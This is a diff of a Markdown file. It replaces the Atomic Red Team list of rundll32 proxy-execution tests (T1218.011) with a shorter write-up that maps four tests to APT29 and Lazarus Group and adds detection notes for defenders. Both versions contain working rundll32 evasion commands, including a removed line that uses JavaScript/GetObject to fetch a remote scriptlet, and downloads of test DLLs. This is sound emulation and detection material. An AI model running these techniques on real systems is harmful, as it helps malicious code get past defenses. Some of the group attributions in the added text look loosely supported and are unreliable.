@@ -1,720 +1,140 @@
-# T1218.011 - Signed Binary Proxy Execution: Rundll32
-## [Description from ATT&CK](https://attack.mitre.org/techniques/T1218/011)
-<blockquote>
+# Atomic Red Team Tests for APT29 and Lazarus Group - T1218.011 Signed Binary Proxy Execution: Rundll32
 
-Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).
+This repository documents selected **Atomic Red Team tests for T1218.011 (Signed Binary Proxy Execution: Rundll32)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.
 
-Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.
+The goal is to:
+* Provide defenders with a curated set of relevant tests for detecting rundll32 abuse activities
+* Map each test to known adversary behaviors and campaigns
+* Highlight overlap and differences between the groups' execution techniques
 
-Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
+---
 
-Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).
+## Background
 
-Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) 
+* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
+  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
+  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
+  * Employs **rundll32.exe** to execute malicious payloads and bypass application controls
 
-</blockquote>
+* **Lazarus Group** is a North Korean state-sponsored threat group
+  * Known for **financial theft campaigns** and destructive attacks including **Operation Dream Job**
+  * Uses **rundll32.exe** to execute malicious payloads on compromised hosts
+  * Leverages multiple execution methods to evade security controls
 
-## Atomic Tests
+Both groups leverage T1218.011 (Rundll32) because it allows them to:
+* Execute malicious code through a trusted Microsoft-signed binary
+* Bypass application control solutions using legitimate Windows components
+* Load and execute various file types beyond traditional DLLs
+* Avoid detection by blending with normal system operations
 
-- [Atomic Test #1 - Rundll32 execute JavaScript Remote Payload With GetObject](#atomic-test-1---rundll32-execute-javascript-remote-payload-with-getobject)
+---
 
-- [Atomic Test #2 - Rundll32 execute VBscript command](#atomic-test-2---rundll32-execute-vbscript-command)
+## Selected Atomic Tests for T1218.011
 
-- [Atomic Test #3 - Rundll32 execute VBscript command using Ordinal number](#atomic-test-3---rundll32-execute-vbscript-command-using-ordinal-number)
+| Test # | Technique | Description | Used By |
+|--------|-----------|-------------|---------|
+| **10** | Execution of non-dll using rundll32.exe | Executes non-DLL files through rundll32 | **APT29 & Lazarus** |
+| **11** | Rundll32 with Ordinal Value | Uses ordinal values for execution obscurity | **APT29** |
+| **12** | Rundll32 with Control_RunDLL | Executes through Control Panel item method | **APT29** |
+| **14** | Running DLL with .init extension and function | Uses file extension obfuscation for execution | **Lazarus** |
 
-- [Atomic Test #4 - Rundll32 advpack.dll Execution](#atomic-test-4---rundll32-advpackdll-execution)
+---
 
-- [Atomic Test #5 - Rundll32 ieadvpack.dll Execution](#atomic-test-5---rundll32-ieadvpackdll-execution)
+## Detailed Test Analysis
 
-- [Atomic Test #6 - Rundll32 syssetup.dll Execution](#atomic-test-6---rundll32-syssetupdll-execution)
+### Atomic Test #10 - Execution of non-dll using rundll32.exe
+**Technique:** Non-DLL File Execution via Rundll32  
+**Adversary Usage:** APT29 & Lazarus Group  
+**Command:**
+```powershell
+rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW
+```
+**Explanation:** Both groups use rundll32 to execute non-DLL files, exploiting its flexibility in loading various file types. Lazarus Group specifically used this technique during Operation Dream Job to execute a .db file, while APT29 employed similar methods during the SolarWinds campaign.
 
-- [Atomic Test #7 - Rundll32 setupapi.dll Execution](#atomic-test-7---rundll32-setupapidll-execution)
+**APT29 Correlation:** Used during SolarWinds campaign for executing various payload types through trusted utilities.
+**Lazarus Correlation:** Directly used in Operation Dream Job: `rundll32.exe "C:\ProgramData\ThumbNail\thumbnail.db", CtrlPanel...`
 
-- [Atomic Test #8 - Execution of HTA and VBS Files using Rundll32 and URL.dll](#atomic-test-8---execution-of-hta-and-vbs-files-using-rundll32-and-urldll)
-
-- [Atomic Test #9 - Launches an executable using Rundll32 and pcwutl.dll](#atomic-test-9---launches-an-executable-using-rundll32-and-pcwutldll)
-
-- [Atomic Test #10 - Execution of non-dll using rundll32.exe](#atomic-test-10---execution-of-non-dll-using-rundll32exe)
-
-- [Atomic Test #11 - Rundll32 with Ordinal Value](#atomic-test-11---rundll32-with-ordinal-value)
-
-- [Atomic Test #12 - Rundll32 with Control_RunDLL](#atomic-test-12---rundll32-with-control_rundll)
-
-- [Atomic Test #13 - Rundll32 with desk.cpl](#atomic-test-13---rundll32-with-deskcpl)
-
-- [Atomic Test #14 - Running DLL with .init extension and function](#atomic-test-14---running-dll-with-init-extension-and-function)
-
-- [Atomic Test #15 - Rundll32 execute command via FileProtocolHandler](#atomic-test-15---rundll32-execute-command-via-fileprotocolhandler)
-
-- [Atomic Test #16 - Rundll32 execute payload by calling RouteTheCall](#atomic-test-16---rundll32-execute-payload-by-calling-routethecall)
-
-
-<br/>
-
-## Atomic Test #1 - Rundll32 execute JavaScript Remote Payload With GetObject
-Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. 
-This has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)
-
-Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 57ba4ce9-ee7a-4f27-9928-3c70c489b59d
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| file_url | location of the payload | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #11 - Rundll32 with Ordinal Value
+**Technique:** Ordinal Value Execution for Obscurity  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
+rundll32.exe "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll",#2
 ```
+**Explanation:** APT29 uses advanced obfuscation techniques like ordinal value execution to hide malicious activity. This approach makes analysis more difficult by avoiding clear function name references, which aligns with their sophisticated tradecraft.
 
-#### Cleanup Commands:
+### Atomic Test #12 - Rundll32 with Control_RunDLL
+**Technique:** Control Panel Item Execution  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
-taskkill /IM notepad.exe /f
+rundll32.exe shell32.dll,Control_RunDLL "PathToAtomicsFolder\T1047\bin\calc.dll"
 ```
+**Explanation:** APT29 employs multiple execution methods, including abuse of Control Panel item execution through rundll32. This technique provides alternative execution vectors that may evade monitoring focused on traditional DLL loading.
 
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #2 - Rundll32 execute VBscript command
-Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
-Upon execution calc.exe will be launched
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 638730e7-7aed-43dc-bf8c-8117f805f5bb
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| command_to_execute | Command for rundll32.exe to execute | string | calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
+### Atomic Test #14 - Running DLL with .init extension and function
+**Technique:** File Extension Obfuscation  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```cmd
-rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+rundll32.exe PathToAtomicsFolder\T1218.011\bin\_WT.init,krnl
 ```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #3 - Rundll32 execute VBscript command using Ordinal number
-Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
-Upon execution calc.exe will be launched
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 32d1cf1b-cbc2-4c09-8d05-07ec5c83a821
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| command_to_execute | Command for rundll32.exe to execute | string | calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
-```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #4 - Rundll32 advpack.dll Execution
-Test execution of a command using rundll32.exe with advpack.dll.
-Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
-Upon execution calc.exe will be launched
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** d91cae26-7fc1-457b-a854-34c8aad48c89
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| inf_to_execute | Local location of inf file | string | PathToAtomicsFolder&#92;T1218.011&#92;src&#92;T1218.011.inf|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Inf file must exist on disk at specified location ("#{inf_to_execute}")
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #5 - Rundll32 ieadvpack.dll Execution
-Test execution of a command using rundll32.exe with ieadvpack.dll.
-Upon execution calc.exe will be launched
-
-Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 5e46a58e-cbf6-45ef-a289-ed7754603df9
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| inf_to_execute | Local location of inf file | string | PathToAtomicsFolder&#92;T1218.011&#92;src&#92;T1218.011.inf|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Inf file must exist on disk at specified location ("#{inf_to_execute}")
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #6 - Rundll32 syssetup.dll Execution
-Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
-
-Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 41fa324a-3946-401e-bbdd-d7991c628125
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| inf_to_execute | Local location of inf file | string | PathToAtomicsFolder&#92;T1218.011&#92;src&#92;T1218.011_DefaultInstall.inf|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "#{inf_to_execute}"
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Inf file must exist on disk at specified location ("#{inf_to_execute}")
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #7 - Rundll32 setupapi.dll Execution
-Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
-
-Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 71d771cd-d6b3-4f34-bc76-a63d47a10b19
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| inf_to_execute | Local location of inf file | string | PathToAtomicsFolder&#92;T1218.011&#92;src&#92;T1218.011_DefaultInstall.inf|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Inf file must exist on disk at specified location ("#{inf_to_execute}")
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #8 - Execution of HTA and VBS Files using Rundll32 and URL.dll
-IcedID uses this TTP as follows:
-  rundll32.exe url.dll,OpenURL %PUBLIC%\index.hta
-Trickbot uses this TTP as follows:
-  rundll32.exe URL.dll,FileProtocolHandler C:\\..\\Detail\\akteullen.vbs
-
-In this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with "rundll32 spawned wscript"
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 22cfde89-befe-4e15-9753-47306b37a6e3
-
-
-
-
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe url.dll,OpenURL "PathToAtomicsFolder\T1218.011\src\index.hta"
-rundll32.exe URL.dll,FileProtocolHandler "PathToAtomicsFolder\T1218.011\src\akteullen.vbs"
-```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #9 - Launches an executable using Rundll32 and pcwutl.dll
-Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| exe_to_launch | Path of the executable to launch | path | %windir%&#92;System32&#92;notepad.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
-```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #10 - Execution of non-dll using rundll32.exe
-Rundll32.exe running non-dll
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** ae3a8605-b26e-457c-b6b3-2702fd335bac
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| input_url | Url to download the DLL | url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll|
-| input_file | Non-dll file | string | C:&#92;Users&#92;$env:username&#92;Downloads&#92;calc.png|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-rundll32.exe #{input_file}, StartW
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Non-dll file must exist on disk at specified location
-##### Check Prereq Commands:
-```powershell
-if (Test-Path #{input_file}) {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #11 - Rundll32 with Ordinal Value
-Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. 
-Upon successful execution, Calc.exe will spawn.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| input_url | Url to download the DLL | url | https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll|
-| input_file | DLL File | string | PathToAtomicsFolder&#92;T1218.010&#92;bin&#92;AllTheThingsx64.dll|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe "#{input_file}",#2
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: DLL file must exist on disk at specified location
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{input_file}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #12 - Rundll32 with Control_RunDLL
-Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** e4c04b6f-c492-4782-82c7-3bf75eb8077e
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| input_url | Url to download the DLL | url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll|
-| input_file | DLL File | string | PathToAtomicsFolder&#92;T1047&#92;bin&#92;calc.dll|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: DLL file must exist on disk at specified location
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{input_file}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #13 - Rundll32 with desk.cpl
-Rundll32.exe loading an executable renamed as .scr using desk.cpl 
-Reference: 
-  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)
-SIGMA rules:
-  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)
-  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 83a95136-a496-423c-81d3-1c6750133917
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| exe_to_launch | Path of the executable to launch | path | %windir%&#92;System32&#92;calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-copy #{exe_to_launch} not_an_scr.scr
-rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
-```
-
-#### Cleanup Commands:
-```cmd
-del not_an_scr.scr
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #14 - Running DLL with .init extension and function
-This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.
-DLL created with the AtomicTestHarnesses Portable Executable Builder script.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 2d5029f0-ae20-446f-8811-e7511b58e8b6
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| dll_file | The DLL file to be called | string | PathToAtomicsFolder&#92;T1218.011&#92;bin&#92;_WT.init|
-| dll_url | The URL to the DLL file that must be downloaded | url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe #{dll_file},krnl
-```
-
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: The DLL file to be called must exist at the specified location (#{dll_file})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{dll_file}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{dll_file}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "#{dll_url}" -OutFile "#{dll_file}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #15 - Rundll32 execute command via FileProtocolHandler
-Test execution of a command using rundll32.exe and the FileProtocolHandler technique.
-Upon execution, calc.exe will be launched.
-This technique is documented by Levan Abesadze - https://medium.com/@Wolverineisstillalive/system-binary-proxy-execution-rundll32-bypass-method-790871e1f2b7
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| command_to_execute | Command for rundll32.exe to execute | string | calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}
-```
-
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #16 - Rundll32 execute payload by calling RouteTheCall
-Launch an executable payload by calling RouteTheCall. Test execution of a command using rundll32.exe to execute a payload{calc.exe} by calling RouteTheCall. Upon execution, calc.exe will be launched.
-Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 8a7f56ee-10e7-444c-a139-0109438288eb
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| exe_to_launch | Path of the executable to launch | path | '%windir%&#92;System32&#92;calc.exe'|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-rundll32.exe zipfldr.dll,RouteTheCall "#{exe_to_launch}"
-```
-
-
-
-
-
-
-<br/>
+**Explanation:** Lazarus Group uses file extension obfuscation to evade detection. This test demonstrates executing a DLL with an .init extension, similar to how Lazarus used a .db file extension to disguise malicious payloads during Operation Dream Job.
+
+---
+
+## Correlation with APT29 & Lazarus
+
+* **APT29 Focus:**
+  * Advanced obfuscation techniques (#11 - ordinal values)
+  * Multiple execution methods (#12 - Control_RunDLL)
+  * Sophisticated tradecraft for defense evasion
+  → Used for stealthy payload execution during espionage operations
+
+* **Lazarus Group Focus:**
+  * File extension obfuscation (#14 - .init files)
+  * Non-traditional file execution (#10 - .db files)
+  * Direct payload execution through trusted binaries
+  → Used for rapid payload deployment in financial and destructive attacks
+
+* **Overlap:**
+  * Both groups abuse **rundll32.exe** for execution
+  * Both leverage **trusted Windows utilities** to evade detection
+  * Both use **file type manipulation** to bypass security controls
+  * Both employ **multiple execution methods** in attack chains
+
+---
+
+## Defender Notes
+
+* These tests are high-value because they **closely emulate real-world adversary tradecraft**
+* Detection should focus on:
+  * rundll32.exe executing non-DLL files (#10 - especially unusual extensions)
+  * rundll32.exe with ordinal values instead of function names (#11)
+  * Unusual file extensions being loaded by rundll32 (#14 - .init, .db, etc.)
+  * Control_RunDLL and other non-standard execution methods (#12)
+  * rundll32.exe executing from unusual directories or with unusual parent processes
+
+* Correlation across events is essential:
+  * Process creation + file operations with unusual extensions
+  * Command line analysis for obfuscation techniques
+  * Parent-child process relationships involving rundll32
+  * Multiple execution methods chained together
+
+* Implement application control to restrict rundll32.exe if not needed for business purposes
+* Monitor for rundll32.exe execution patterns that deviate from normal administrative use
+
+## Campaign References
+
+1. **APT29 SolarWinds Campaign** (2020): Used rundll32 for various payload execution methods during the compromise
+2. **Lazarus Operation Dream Job**: Used rundll32 to execute thumbnail.db file with specific parameters
+3. **APT29 Various Operations**: Employed advanced rundll32 techniques for defense evasion in espionage campaigns
+4. **Lazarus Financial Attacks**: Used rundll32 for payload execution in banking network penetration
+
+## Academic References
+
+1. MITRE ATT&CK Technique T1218.011 - Signed Binary Proxy Execution: Rundll32
+2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
+3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group TTPs)
+4. CrowdStrike: "APT29 Tradecraft and Techniques" (2023)
+5. Kaspersky: "Lazarus Group Operation Dream Job Analysis" (2022)
